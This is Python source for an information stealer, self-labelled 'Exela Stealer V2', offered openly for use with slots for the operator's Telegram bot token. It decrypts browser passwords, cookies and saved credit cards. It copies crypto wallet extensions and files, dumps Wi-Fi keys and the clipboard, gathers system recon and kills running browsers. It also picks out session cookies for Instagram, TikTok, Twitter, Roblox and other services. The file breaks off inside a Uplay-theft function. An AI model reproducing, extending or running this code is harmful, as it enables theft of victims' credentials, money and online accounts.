from importlib import import_module
import ctypes, platform
import subprocess
import json, sys
import shutil
import sqlite3
from urllib.request import urlopen, Request
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import re
import os
import asyncio
import base64
import time
import requests
from sys import executable
from json import loads
from telegram import InputFile # type: ignore
from telegram import Bot # type: ignore

# Exela Stealer V2 !
# i just changed logs send, now this stealer send logs to telegram
# for more ... -> https://t.me/Exela_Stealer

bot = Bot(token='put ur telegram token here (to create a telegram token bot add @botfather on telegram and build one)')
chat_id = '-100put ur private chat id group here (to get a chat id open telegram on telegram web and take the number after the "-" on the link of ur group, example -> -100123456789)'
Anti_VM = bool(True)

requirements = [
    ["requests", "requests"],
    ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodome']
]

def check_path():

    base_dir = f'C:\\Users\\{os.getlogin}\\AppData\\Local\\Programs\\Python'

    python_versions = [f for f in os.listdir(base_dir) if f.startswith('Python')]

    for py_ver in python_versions:
        cryptodome_path = f'C:\\Users\\{os.getlogin}\\AppData\\Local\\Programs\\Python\\{py_ver}\\Lib\\site-packages\\Cryptodome'
        crypto_path = f'C:\\Users\\{os.getlogin}\\AppData\\Local\\Programs\\Python\\{py_ver}\\Lib\\site-packages\\Crypto'
        try:
            if os.path.exists(cryptodome_path):
                shutil.copytree(cryptodome_path, crypto_path, dirs_exist_ok=True)  
        except:
            pass


    
for module in requirements:
    try: 
        import_module(module[0])
    except:
        subprocess.Popen(f"\"{executable}\" -m pip install {module[1]} --quiet", shell=True)
        time.sleep(3)
try:          
    try:
        from Cryptodome.Cipher import AES
    except:
        try:
            check_path()
            from Cryptodome.Cipher import AES
        except:
            subprocess.Popen(executable + " -m pip install pycryptodome  ", shell=True)
            from Crypto.Cipher import AES
except:
    pass

import requests
        

def error_Handler(err):
    if isinstance(err, TypeError):
        print("An error occurred: TypeError -", err)
    else:
        print("An error occurred:", err)

    with open('error.txt', 'a')as f:
        f.write(f"{err}\n")

class Variables:
    Passwords = list()
    Cards = list()
    Cookies = list()
    Historys = list()
    Downloads = list()
    Autofills = list()
    Bookmarks = list()
    Wifis = list()
    SystemInfo = list()
    ClipBoard = list()
    Processes = list()
    Network = list()
    FullTokens = list()
    ValidatedTokens = list()
    DiscordAccounts = list()
    SteamAccounts = list()
    InstagramAccounts = list()
    TwitterAccounts = list()
    TikTokAccounts = list()
    RedditAccounts = list()
    TwtichAccounts = list()
    SpotifyAccounts = list()
    RobloxAccounts = list()
    RiotGameAccounts = list()

class SubModules:
    # Calls the CryptUnprotectData function from crypt32.dll
    @staticmethod
    def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str= None) -> bytes: 

        class DATA_BLOB(ctypes.Structure):

            _fields_ = [
                ("cbData", ctypes.c_ulong),
                ("pbData", ctypes.POINTER(ctypes.c_ubyte))
            ]
        
        pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
        pDataOut = DATA_BLOB()
        pOptionalEntropy = None

        if optional_entropy is not None:
            optional_entropy = optional_entropy.encode("utf-16")
            pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))

        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
            data = (ctypes.c_ubyte * pDataOut.cbData)()
            ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
            ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
            return bytes(data)

        raise ValueError("Invalid encrypted_data provided!")

    @staticmethod
    def GetKey(FilePath:str) -> bytes:
        with open(FilePath,"r", encoding= "utf-8", errors= "ignore") as file:
            jsonContent: dict = json.load(file)

            encryptedKey: str = jsonContent["os_crypt"]["encrypted_key"]
            encryptedKey = base64.b64decode(encryptedKey.encode())[5:]

            return SubModules.CryptUnprotectData(encryptedKey)

    @staticmethod
    def Decrpytion(EncrypedValue: bytes, EncryptedKey: bytes) -> str:
        try:
            version = EncrypedValue.decode(errors="ignore")
            if version.startswith("v10") or version.startswith("v11"):
                iv = EncrypedValue[3:15]
                password = EncrypedValue[15:]
                authentication_tag = password[-16:]
                password = password[:-16]
                backend = default_backend()
                cipher = Cipher(algorithms.AES(EncryptedKey), modes.GCM(iv, authentication_tag), backend=backend)
                decryptor = cipher.decryptor()
                decrypted_password = decryptor.update(password) + decryptor.finalize()
                return decrypted_password.decode('utf-8')
            else:
                return str(SubModules.CryptUnprotectData(EncrypedValue))
        except:
            return "Decryption Error!, Data cant be decrypt"
        
    @staticmethod
    def create_mutex(mutex_value) -> bool:
        kernel32 = ctypes.windll.kernel32 #kernel32.dll 
        mutex = kernel32.CreateMutexA(None, False, mutex_value)
        return kernel32.GetLastError() != 183
    
    @staticmethod
    def IsAdmin() -> bool:
        try:
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except:
            return False


class StealSystemInformation:
    async def FunctionRunner(self) -> None:
        try:
            tasks = [
                asyncio.create_task(self.StealSystemInformation()),
                asyncio.create_task(self.StealWifiInformation()),
                asyncio.create_task(self.StealProcessInformation()),
                asyncio.create_task(self.StealNetworkInformation()),
                asyncio.create_task(self.StealLastClipBoard()),
            ]

            await asyncio.gather(*tasks)
        except Exception as error:
            print(f"[-] An error occured while starting processes at the same time for steal system information, Error code => \"{error}\"")

    async def GetDefaultSystemEncoding(self) -> str:
        try:
            cmd = "cmd.exe /c chcp"
            process = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
            stdout, stderr = await process.communicate()
            return stdout.decode(errors="ignore").split(":")[1].strip()
        except:
            return "null"

    async def StealSystemInformation(self) -> None:
        try:
            print("[+] Stealing system information")
            current_code_page = await self.GetDefaultSystemEncoding()
            result = await asyncio.create_subprocess_shell(r'echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable#### & set & echo ####Logical Disk#### & wmic logicaldisk get caption,description,providername & echo ####User Info#### & net user & echo ####Online User#### & query user & echo ####Local Group#### & net localgroup & echo ####Administrators Info#### & net localgroup administrators & echo ####Guest User Info#### & net user guest & echo ####Administrator User Info#### & net user administrator & echo ####Startup Info#### & wmic startup get caption,command & echo ####Tasklist#### & tasklist /svc & echo ####Ipconfig#### & ipconfig/all & echo ####Hosts#### & type C:\WINDOWS\System32\drivers\etc\hosts & echo ####Route Table#### & route print & echo ####Arp Info#### & arp -a & echo ####Netstat#### & netstat -ano & echo ####Service Info#### & sc query type= service state= all & echo ####Firewallinfo#### & netsh firewall show state & netsh firewall show config', stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
            stdout, stderr = await result.communicate()
            Variables.SystemInfo.append(stdout.decode(current_code_page))
            print("[+] System information was successfully stolen")
        except Exception as error:
            print(f"[-] An error occured while stealing system information, error code => \"{error}\"")

    async def StealProcessInformation(self) -> None:
        try:
            print("[+] Stealing running processes")
            process = await asyncio.create_subprocess_shell(
                "tasklist /FO LIST",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True
            )
            stdout, stderr = await process.communicate()
            Variables.Processes.append(stdout.decode(errors="ignore"))
            print("[+] Running processes was successfully stolen")
        except Exception as error:
            print(f"[-] An error occured while stealing process information, => error code \"{error}\"")

    async def StealLastClipBoard(self) -> None:
        try:
            print("[+] Stealing Last ClipBoard Text")
            process = await asyncio.create_subprocess_shell(
                "powershell.exe Get-Clipboard",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True
            )
            stdout, stderr = await process.communicate()
            if stdout:
                Variables.ClipBoard.append(stdout.decode(errors="ignore")) 
            print("[+] Last ClipBoard Text was successfully stolen")
        except Exception as error:
            print(f"[-] An error occured while stealing \"Last Clipboard Text\", => error code \"{error}\"")


    async def StealNetworkInformation(self) -> None:
        try:
            pi = '/nosj/moc.ipa-pi'[::-1]
            getip = requests.get(f"http://{pi}").json()
            theip = getip["query"]
            ipp = requests.get(f"http://ip-api.com/json/{theip}?fields=192511").json()
            proxy = ipp.get("proxy", "Error")
            url = 'nosj/moc.ipa-pi//:ptth'[::-1]
            req = requests.get(url)
            data = req.json()
            ip = data["query"]
            country = data["country"]
            city = data["city"]
            timezone = data["timezone"]
            isp_info = data["isp"] + f" {data['org']} {data['as']}"
            Variables.Network.append((ip, country, city, timezone, isp_info, proxy))
        except Exception as error:
            print(f"[-] An error occured while stealing network information, => error code \"{error}\"")

    async def StealWifiInformation(self) -> None:
        try:
            print("[+] Stealing wifi passwords")
            current_code_page = await self.GetDefaultSystemEncoding()

            process = await asyncio.create_subprocess_shell(
                "netsh wlan show profiles", 
                stdout=asyncio.subprocess.PIPE, 
                stderr=asyncio.subprocess.PIPE, 
                shell=True)
            
            stdout, stderr = await process.communicate()
            decoded_profiles = None

            try:
                decoded_profiles = stdout.decode(current_code_page)
            except:
                decoded_profiles = stdout.decode(errors="ignore")
            
            wifi_profile_names = re.findall(r'All User Profile\s*: (.*)', decoded_profiles)
            for profile_name in wifi_profile_names:
                result = await asyncio.create_subprocess_shell(
                    f'netsh wlan show profile name="{profile_name}" key=clear',
                    stdout=asyncio.subprocess.PIPE,
                    shell=True,
                    encoding=None
                )
                stdout, _ = await result.communicate()
                try:
                    profile_output = stdout.decode(current_code_page)
                except:profile_output = stdout.decode(errors="ignore")
                wifi_passwords = re.search(r'Key content\s*: (.*)', profile_output, re.IGNORECASE)

                Variables.Wifis.append((profile_name, wifi_passwords.group(1) if wifi_passwords else "No password found"))
            print("[+] Wifi passwords was successfully stolen")
        except Exception as error:
            print(f"[-] An error occurred while stealing wifi information, error code => \"{error}\"")


class Main:
    def __init__(self) -> None:
        self.profiles_full_path = list()
        self.RoamingAppData = os.getenv('APPDATA')
        self.LocalAppData = os.getenv('LOCALAPPDATA')
        self.Temp = os.getenv('TEMP') 
        self.FireFox = bool()
        self.FirefoxFilesFullPath = list()
        self.FirefoxCookieList = list()
        self.FirefoxHistoryList = list()
        self.FirefoxAutofiList = list()
    async def FunctionRunner(self):
        await self.kill_browsers()
        self.list_profiles()
        self.ListFirefoxProfiles()
        taskk = [
            asyncio.create_task(self.GetPasswords()), asyncio.create_task(self.GetCards()), asyncio.create_task(self.GetCookies()),
            asyncio.create_task(self.GetFirefoxCookies()), asyncio.create_task(self.GetHistory()), asyncio.create_task(self.GetFirefoxHistorys()),
            asyncio.create_task(self.GetDownload()), asyncio.create_task(self.GetBookMark()), asyncio.create_task(self.GetAutoFill()), 
            asyncio.create_task(self.GetFirefoxAutoFills()), asyncio.create_task(self.GetTokens()), StealSystemInformation().FunctionRunner()]
        
        await asyncio.gather(*taskk)
        await self.WriteToText()
        await self.SendAllData()
    def list_profiles(self) -> None:
        directorys = {
            "Opera": os.path.join(self.RoamingAppData, "Opera Software", "Opera Stable"),
            "Thunderbird": os.path.join(self.RoamingAppData, "Thunderbird", "Profiles"),
            "Waterfox": os.path.join(self.RoamingAppData, "Waterfox", "Profiles"),
            "K-Meleon": os.path.join(self.RoamingAppData, "K-Meleon", "Profiles"),
            "Mercury": os.path.join(self.RoamingAppData, "mercury", "Profiles"),
            "Amigo": os.path.join(self.LocalAppData, "Amigo", "User Data"),
            "Torch": os.path.join(self.LocalAppData, "Torch", "User Data"),
            "uran": os.path.join(self.LocalAppData, "uCozMedia", "Uran", "User Data"),
            "CentBrowser": os.path.join(self.LocalAppData, "CentBrowser", "User Data"),
            "Edge": os.path.join(self.LocalAppData, "Microsoft", "Edge", "User Data"),
            "Coowon": os.path.join(self.LocalAppData, "Coowon", "Coowon", "User Data"),
            "Dragon": os.path.join(self.LocalAppData, "Comodo", "Dragon", "User Data"),
            "CocCoc": os.path.join(self.LocalAppData, "CocCoc", "Browser", "User Data"),
            "Elements": os.path.join(self.LocalAppData, "Elements Browser", "User Data"),
            "Sputnik": os.path.join(self.LocalAppData, "Sputnik", "Sputnik", "User Data"),
            "yandex": os.path.join(self.LocalAppData, "Yandex", "YandexBrowser", "User Data"),
            "Google Chrome": os.path.join(self.LocalAppData, "Google", "Chrome", "User Data"),
            "Maple": os.path.join(self.LocalAppData, "MapleStudio", "ChromePlus", "User Data"),
            "Catalina": os.path.join(self.LocalAppData, "CatalinaGroup", "Citrio", "User Data"),
            "360Browser": os.path.join(self.LocalAppData, "360Browser", "Browser", "User Data"),
            "Chrome (x86)": os.path.join(self.LocalAppData, "Google(x86)", "Chrome", "User Data"),
            "Brave": os.path.join(self.LocalAppData, "BraveSoftware", "Brave-Browser", "User Data"),
            "google-chrome-sxs": os.path.join(self.LocalAppData, "Google", "Chrome SxS", "User Data"),
            "epic-privacy-browser": os.path.join(self.LocalAppData, "Epic Privacy Browser", "User Data"),
            "Fenrir": os.path.join(self.LocalAppData, "Fenrir Inc", "Sleipnir5", "setting", "modules", "ChromiumViewer"),
            
        }
        for junk, directory in directorys.items():
            if os.path.isdir(directory):
                if "Opera" in directory:
                    self.profiles_full_path.append(directory)
                else:
                    for root, folders, files in os.walk(directory):
                        for folder in folders:
                            folder_path = os.path.join(root, folder)
                            if folder == 'Default' or folder.startswith('Profile') or "Guest Profile" in folder:
                                self.profiles_full_path.append(folder_path)
    def ListFirefoxProfiles(self) -> None:
        try:
            directory = os.path.join(self.RoamingAppData , "Mozilla", "Firefox", "Profiles")
            if os.path.isdir(directory):
                for root, dirs, files in os.walk(directory):
                    for file in files:
                        file_path = os.path.join(root, file)
                        if file.endswith("cookies.sqlite") or file.endswith("places.sqlite") or file.endswith("formhistory.sqlite"):
                            self.FirefoxFilesFullPath.append(file_path)
        except:
            pass
    async def kill_browsers(self):
        process_names = ["chrome.exe", "opera.exe", "edge.exe", "firefox.exe", "brave.exe"]
        process = await asyncio.create_subprocess_shell(
            'tasklist',
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        stdout, stderr = await process.communicate()
        if not process.returncode != 0:
            output_lines = stdout.decode(errors="ignore").split('\n')
            for line in output_lines:
                for process_name in process_names:
                    if process_name.lower() in line.lower():
                        parts = line.split()
                        pid = parts[1]
                        process = await asyncio.create_subprocess_shell(
                        f'taskkill /F /PID {pid}',
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE
                        )
                        await process.communicate()
    async def GetFirefoxCookies(self) -> None:
        try:
            for files in self.FirefoxFilesFullPath:
                if "cookie" in files:
                    database_connection = sqlite3.connect(files)
                    cursor = database_connection.cursor()
                    cursor.execute('SELECT host, name, path, value, expiry FROM moz_cookies')
                    twitch_username = None
                    twitch_cookie = None
                    cookies = cursor.fetchall()
                    for cookie in cookies:
                        self.FirefoxCookieList.append(f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{cookie[3]}\n")
                        if "instagram" in str(cookie[0]).lower() and "sessionid" in str(cookie[1]).lower():
                            asyncio.create_task(self.InstaSession(cookie[3], "Firefox"))
                        if "tiktok" in str(cookie[0]).lower() and str(cookie[1]) == "sessionid":
                            asyncio.create_task(self.TikTokSession(cookie[3], "Firefox"))
                        if "twitter" in str(cookie[0]).lower() and str(cookie[1]) == "auth_token":
                            asyncio.create_task(self.TwitterSession(cookie[3], "Firefox"))
                        if "reddit" in str(cookie[0]).lower() and "reddit_session" in str(cookie[1]).lower():
                            asyncio.create_task(self.RedditSession(cookie[3], "Firefox"))
                        if "spotify" in str(cookie[0]).lower() and "sp_dc" in str(cookie[1]).lower():
                            asyncio.create_task(self.SpotifySession(cookie[3], "Firefox"))
                        if "roblox" in str(cookie[0]).lower() and "ROBLOSECURITY" in str(cookie[1]):
                            asyncio.create_task(self.RobloxSession(cookie[3], "Firefox"))
                        if "twitch" in str(cookie[0]).lower() and "auth-token" in str(cookie[1]).lower():
                            twitch_cookie = cookie[3]
                        if "twitch" in str(cookie[0]).lower() and str(cookie[1]).lower() == "login":
                            twitch_username = cookie[3]
                        if not twitch_username == None and not twitch_cookie == None:
                            asyncio.create_task(self.TwitchSession(twitch_cookie, twitch_username, "Firefox"))
                            twitch_username = None
                            twitch_cookie = None
                        if "account.riotgames.com" in str(cookie[0]).lower() and "sid" in str(cookie[1]).lower():
                            asyncio.create_task(self.RiotGamesSession(cookie[3], "Firefox"))
        except:
            pass
        else:
            self.FireFox = True
    async def GetFirefoxHistorys(self) -> None:
        try:
            for files in self.FirefoxFilesFullPath:
                if "places" in files:
                    database_connection = sqlite3.connect(files)
                    cursor = database_connection.cursor()
                    cursor.execute('SELECT id, url, title, visit_count, last_visit_date FROM moz_places')
                    historys = cursor.fetchall()
                    for history in historys:
                        self.FirefoxHistoryList.append(f"ID: {history[0]}\nRL: {history[1]}\nTitle: {history[2]}\nVisit Count: {history[3]}\nLast Visit Time: {history[4]}\n====================================================================================\n")
        except:
            pass
        else:
            self.FireFox = True
    async def GetFirefoxAutoFills(self) -> None:
        try:
            for files in self.FirefoxFilesFullPath:
                if "formhistory" in files:
                    database_connection = sqlite3.connect(files)
                    cursor = database_connection.cursor()
                    cursor.execute("select * from moz_formhistory")
                    autofills = cursor.fetchall()
                    for autofill in autofills:
                        self.FirefoxAutofiList.append(f"{autofill}\n")
        except:
            pass
        else:
            self.FireFox = True
    async def GetPasswords(self) -> None:
        try:
            for path in self.profiles_full_path:
                BrowserName = "None"
                index = path.find("User Data")
                if index != -1:
                    user_data_part = path[:index + len("User Data")]
                if "Opera" in path:
                    user_data_part = path
                    BrowserName = "Opera"
                else:
                    text = path.split("\\")
                    BrowserName = text[-4] + " " + text[-3]
                key = SubModules.GetKey(os.path.join(user_data_part, "Local State"))
                LoginData = os.path.join(path, "Login Data")
                copied_file_path = os.path.join(self.Temp, "Logins.db")
                shutil.copyfile(LoginData, copied_file_path)
                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select origin_url, username_value, password_value from logins')
                logins = cursor.fetchall()
                try:
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except:pass
                for login in logins:
                    if login[0] and login[1] and login[2]:
                        Variables.Passwords.append(f"URL : {login[0]}\nUsername : {login[1]}\nPassword : {SubModules.Decrpytion(login[2], key)}\nBrowser : {BrowserName}\n======================================================================\n")
        except:
            pass
    async def GetCards(self) -> None:
        try:
            for path in self.profiles_full_path:
                index = path.find("User Data")
                if index != -1:
                    user_data_part = path[:index + len("User Data")]
                if "Opera" in path:
                    user_data_part = path
                key = SubModules.GetKey(os.path.join(user_data_part, "Local State"))
                WebData = os.path.join(path, "Web Data")
                copied_file_path = os.path.join(self.Temp, "Web.db")
                shutil.copyfile(WebData, copied_file_path)
                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select card_number_encrypted, expiration_year, expiration_month, name_on_card from credit_cards')
                cards = cursor.fetchall()
                try:
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except:pass
                for card in cards:
                    if card[2] < 10:
                        month = "0" + str(card[2])
                    else:month = card[2]
                    Variables.Cards.append(f"{SubModules.Decrpytion(card[0], key)}\t{month}/{card[1]}\t{card[3]}\n")
        except:
            pass 
    async def GetCookies(self) -> None:
        try:
            for path in self.profiles_full_path:
                BrowserName = "None"
                index = path.find("User Data")
                if index != -1:
                    user_data_part = path[:index + len("User Data")]
                if "Opera" in path:
                    user_data_part = path
                    BrowserName = "Opera"
                else:
                    text = path.split("\\")
                    BrowserName = text[-4] + " " + text[-3]
                key = SubModules.GetKey(os.path.join(user_data_part, "Local State"))
                CookieData = os.path.join(path, "Network", "Cookies")
                copied_file_path = os.path.join(self.Temp, "Cookies.db")
                try:
                    shutil.copyfile(CookieData, copied_file_path)
                except:
                    pass
                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select host_key, name, path, encrypted_value,expires_utc from cookies')
                cookies = cursor.fetchall()
                try:
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except:pass
                twitch_username = None
                twitch_cookie = None
                for cookie in cookies:
                    dec_cookie = SubModules.Decrpytion(cookie[3], key)
                    Variables.Cookies.append(f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{dec_cookie}\n")
                    if "instagram" in str(cookie[0]).lower() and "sessionid" in str(cookie[1]).lower():
                        asyncio.create_task(self.InstaSession(dec_cookie, BrowserName))
                    if "tiktok" in str(cookie[0]).lower() and str(cookie[1]) == "sessionid":
                        asyncio.create_task(self.TikTokSession(dec_cookie, BrowserName))
                    if "twitter" in str(cookie[0]).lower() and str(cookie[1]) == "auth_token":
                        asyncio.create_task(self.TwitterSession(dec_cookie, BrowserName))
                    if "reddit" in str(cookie[0]).lower() and "reddit_session" in str(cookie[1]).lower():
                        asyncio.create_task(self.RedditSession(dec_cookie, BrowserName))
                    if "spotify" in str(cookie[0]).lower() and "sp_dc" in str(cookie[1]).lower():
                        asyncio.create_task(self.SpotifySession(dec_cookie, BrowserName))
                    if "roblox" in str(cookie[0]).lower() and "ROBLOSECURITY" in str(cookie[1]):
                        asyncio.create_task(self.RobloxSession(dec_cookie, BrowserName))
                    if "twitch" in str(cookie[0]).lower() and "auth-token" in str(cookie[1]).lower():
                        twitch_cookie = dec_cookie
                    if "twitch" in str(cookie[0]).lower() and str(cookie[1]).lower() == "login":
                        twitch_username = dec_cookie
                    if not twitch_username == None and not twitch_cookie == None:
                        asyncio.create_task(self.TwitchSession(twitch_cookie, twitch_username, BrowserName))
                        twitch_username = None
                        twitch_cookie = None
                    if "account.riotgames.com" in str(cookie[0]).lower() and "sid" in str(cookie[1]).lower():
                        asyncio.create_task(self.RiotGamesSession(dec_cookie, BrowserName))
        except:
            pass
    async def GetWallets(self, copied_path:str) -> None:
        try:
            wallets_ext_names = {
                "MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
                "Hashpack": "gjagmgiddbbciopjhllkdnddhcglnemk",
                "Cyano": "dkdedlpgdmmkkfjabffeganieamfklkm",
                "SenderWallet": "epapihdplajcdnnkdeiahlgigofloibg",
                "Zecrey": "ojbpcbinjmochkhelkflddfnmcceomdi",
                "Auro": "cnmamaachppnkjgnildpdmkaakejnhae",
                "Rabby": "acmacodkjbdgmoleebolmdjonilkdbch",
                "NeoLine": "cphhlgmgameodnhkjdmkpanlelnlohao",
                "Nabox": "nknhiehlklippafakaeklbeglecifhad",
                "KHC": "hcflpincpppdclinealmandijcmnkbgn",
                "CLW": "nhnkbkgjikgcigadomkphalanndcapjk",
                "Polymesh": "jojhfeoedkpkglbfimdfabpdfjaoolaf",
                "ZilPay": "klnaejjgbibmhlephnhpmaofohgkpgkd",
                "Byone": "nlgbhdfgdhgbiamfdfmbikcdghidoadd",
                "Eternl": "kmhcihpebfmpgmihbkipmjlmmioameka",
                "MaiarDeFiWallet": "dngmlblcodfobpdpecaadgfbcggfjfnm",
                "LeafWallet": "cihmoadaighcejopammfbmddcmdekcje",
                "TrustWallet": "egjidjbpglichdcondbcbdnbeeppgdph",
                "BraveWallet": "odbfpeeihdkbihmopkbjmoonfanlbfcl",
                "MEWCX": "nlbmnnijcnlegkjjpcfjclmcfggfefdm",
                "Flint": "hnhobjmcibchnmglfbldbfabcgaknlkj",
                "CardWallet": "apnehcjmnengpnmccpaibjmhhoadaico",
                "CryptoAirdrop": "dhgnlgphgchebgoemcjekedjjbifijid",
                "Authy": "gaedmjdfmmahhbjefcbgaolhhanlaolb",
                "EOSAuthenticator": "oeljdldpnmdbchonielidgobddffflal",
                "GAuthAuthenticator": "ilgcnhelpchnceeipipijaljkblbcobl",
                "BoltX": "aodkkagnadcbobfpggfnjeongemjbjca",
                "Core": "agoakfejjabomempkjlepdflaleeobhb",
                "Ever": "cgeeodpfagjceefieflmdfphplkenlfk",
                "Fewcha": "ebfidpplhabeedpnhjnobghokpiioolj",
                "Guarda": "hpglfhgfnhbgpjdenjgmdgoeiappafln",
                "Jaxx Liberty": "cjelfplplebdjjenllpjcblmjkfcffne",
                "Kaikas": "jblndlipeogpafnldhgmapagcccfchpi",
                "PaliWallet": "mgffkfbidihjpoaomajlbgchddlicgpn",
                "Petra": "ejjladinnckdgjemekebdpeokbikhfci",
                "Safepal": "lgmpcpglpngdoalbgeoldeajfclnhafa",
                "Saturn": "nkddgncdjgjfcddamfgcmfnlhccnimig",
                "Tokenpocket": "mfgccjchihfkkindfppnaooecgfneiii",
                "XMR.PT": "eigblbgjknlfbajkfhopmcojidlgcehm",
                "XinPay": "bocpokimicclpaiekenaeelehdjllofo",
                }
            wallet_local_paths = {
                "Bitcoin": os.path.join(self.RoamingAppData, "Bitcoin", "wallets"),
                "Zcash": os.path.join(self.RoamingAppData, "Zcash"),
                "Armory": os.path.join(self.RoamingAppData, "Armory"),
                "Bytecoin": os.path.join(self.RoamingAppData, "bytecoin"),
                "Jaxx": os.path.join(self.RoamingAppData, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"),
                "Exodus": os.path.join(self.RoamingAppData, "Exodus", "exodus.wallet"),
                "Ethereum": os.path.join(self.RoamingAppData, "Ethereum", "keystore"),
                "Electrum": os.path.join(self.RoamingAppData, "Electrum", "wallets"),
                "AtomicWallet": os.path.join(self.RoamingAppData, "atomic", "Local Storage","leveldb"),
                "Guarda": os.path.join(self.RoamingAppData, "Guarda", "Local Storage","leveldb"),
                "Coinomi": os.path.join(self.RoamingAppData, "Coinomi", "Coinomi", "wallets"),
            }
            os.mkdir(os.path.join(copied_path, "Wallets"))
            for path in self.profiles_full_path:
                ext_path = os.path.join(path, "Local Extension Settings") 
                if os.path.exists(ext_path):
                    for wallet_name, wallet_addr in wallets_ext_names.items():
                        if os.path.isdir(os.path.join(ext_path, wallet_addr)):
                            try:
                                splited = os.path.join(ext_path, wallet_addr).split("\\")
                                file_name = f"{splited[5]} {splited[6]} {splited[8]} {wallet_name}"
                                os.makedirs(copied_path  + "\\Wallets\\" + file_name)
                                shutil.copytree(os.path.join(ext_path, wallet_addr), os.path.join(copied_path, "Wallets", file_name, wallet_addr))
                            except:
                                continue
            for wallet_names, wallet_paths in wallet_local_paths.items():
                try:
                    if os.path.exists(wallet_paths):
                        shutil.copytree(wallet_paths, os.path.join(copied_path, "Wallets", wallet_names))
                except:continue
        except:
            pass
    async def GetHistory(self) -> None:
        try:
            for path in self.profiles_full_path:
                HistoryData = os.path.join(path, "History")
                copied_file_path = os.path.join(self.Temp, "HistoryData.db")
                shutil.copyfile(HistoryData, copied_file_path)
                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select id, url, title, visit_count, last_visit_time from urls')
                historys = cursor.fetchall()
                try:
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except:pass
                for history in historys:
                    Variables.Historys.append(f"ID : {history[0]}\nURL : {history[1]}\nitle : {history[2]}\nVisit Count : {history[3]}\nLast Visit Time {history[4]}\n====================================================================================\n")
        except:
            pass

    async def GetAutoFill(self) -> None:
        try:
            for path in self.profiles_full_path:
                AutofillData = os.path.join(path, "Web Data")
                copied_file_path = os.path.join(self.Temp, "AutofillData.db")
                shutil.copyfile(AutofillData, copied_file_path)
                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select * from autofill')
                autofills = cursor.fetchall()
                try:
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except:pass
                for autofill in autofills:
                    if autofill:
                        Variables.Autofills.append(f"{autofill}\n")
        except Exception as e:print(e)

    async def GetBookMark(self) -> None:
        try:
            for path in self.profiles_full_path:
                BookmarkData = os.path.join(path, "Bookmarks")
                if os.path.isfile(BookmarkData):
                    with open(BookmarkData, "r", encoding="utf-8", errors="ignore") as file:
                        data = json.load(file)
                    data = data["roots"]["bookmark_bar"]["children"]
                    if data:
                        Variables.Bookmarks.append(f"Browser Path : {path}\nID : {data['id']}\nName : {data['name']}\nURL : {data['url']}\nGUID : {data['guid']}\nAdded At : {data['date_added']}\n\n=========================================================")
        except:
            pass
    async def GetDownload(self) -> None:
        try:
            for path in self.profiles_full_path:
                DownloadData = os.path.join(path, "History")
                copied_file_path = os.path.join(self.Temp, "DownloadData.db")
                shutil.copyfile(DownloadData, copied_file_path)
                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select tab_url, target_path from downloads')
                downloads = cursor.fetchall()
                try:
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except:pass
                for download in downloads:
                    Variables.Downloads.append(f"Downloaded URL: {download[0]}\nDownloaded Path: {download[1]}\n\n")
        except:
            pass
    async def StealUplay(self, uuid:str) -> None:
        try:
            found_ubisoft = False
            ubisoft_path = os.path.join(self.LocalAppData, "Ubisoft Game Launcher")
            copied_path = os.path.join(self.Temp, uuid, "Games", "Uplay")
            if os.path.isdir(ubisoft_path):
                if not os.path.exists(copied_path):
                    os.mkdir(copied_path)
                for file in os.listdir(ubisoft_path):
                    name_of_files = os.path.join(ubisoft_path, file)
                    try:
                        shutil.copy(name_of_files, os.path.join(copied_path, file))
                        found_ubisoft = True
                    except:
                        continue
                if found_ubisoft == True:
                    os.mkdir(os.path.join(copied_path, "How to Use"))
                    with open(os.path.join(copied_path,"How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
                        write_file.write("=========================================================================\n")
